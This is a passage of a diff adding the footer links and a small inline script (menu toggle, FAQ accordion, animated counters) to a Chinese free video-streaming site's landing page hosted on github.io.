+        <p>老湿影视（laoshiyingshi）是影视在线观看平台，提供海量高清影视资源免费在线播放，涵盖电影、电视剧、综艺、动漫、纪录片，每日更新热播内容。</p>
+      </div>
+      <div class="ft-col"><h4>影视频道</h4><a href="#channels">电影频道</a><a href="#channels">电视剧频道</a><a href="#channels">综艺频道</a><a href="#channels">动漫频道</a><a href="#channels">纪录片</a></div>
+      <div class="ft-col"><h4>平台服务</h4><a href="#rank">热播榜单</a><a href="#archive">老片库</a><a href="#calendar">更新日历</a><a href="#quality">画质体验</a><a href="#faq">常见问题</a></div>
+      <div class="ft-col"><h4>关于平台</h4><a href="#">关于老湿影视</a><a href="#">版权声明</a><a href="#">用户协议</a><a href="#">隐私政策</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="ft-bot">
+      <span>© 2026 老湿影视 laoshiyingshi · 本站网址：https://laoshiyingshi-cn.github.io · 影视在线观看平台</span>
+      <span><a href="#">网站地图</a><a href="#">免责声明</a><a href="#">服务条款</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var b=document.getElementById('bmb'),m=document.getElementById('menu');
+  b.addEventListener('click',function(){m.classList.toggle('open')});
+  m.addEventListener('click',function(e){if(e.target.tagName==='A')m.classList.remove('open')});
+
+  document.querySelectorAll('.fqi').forEach(function(fi){
+    fi.querySelector('.fqh').addEventListener('click',function(){
+      var open=fi.classList.contains('open');
+      document.querySelectorAll('.fqi').forEach(function(x){x.classList.remove('open')});
+      if(!open)fi.classList.add('open');
+    });
+  });
+
+  function inView(v){var r=v.getBoundingClientRect();return r.top<window.innerHeight*.9&&r.bottom>0}
+  var nd=false;
+  function run(){
+    if(nd)return;
+    var s=document.querySelector('.hero');
+    if(!inView(s))return;
+    nd=true;
+    document.querySelectorAll('[data-n]').forEach(function(el){
+      var t=+el.getAttribute('data-n'),st=performance.now(),dur=1500;
+      (function step(now){
+        var p=Math.min((now-st)/dur,1),e=1-Math.pow(1-p,3);
+        el.textContent=Math.floor(t*e).toLocaleString('zh-CN');
+        if(p<1)requestAnimationFrame(step);
+        else el.textContent=t.toLocaleString('zh-CN');
+      })(st);
+    });
+  }
+  window.addEventListener('scroll',run,{passive:true});
+  window.addEventListener('load',run);
+})();
+</script>
+
+</body>
+</html>
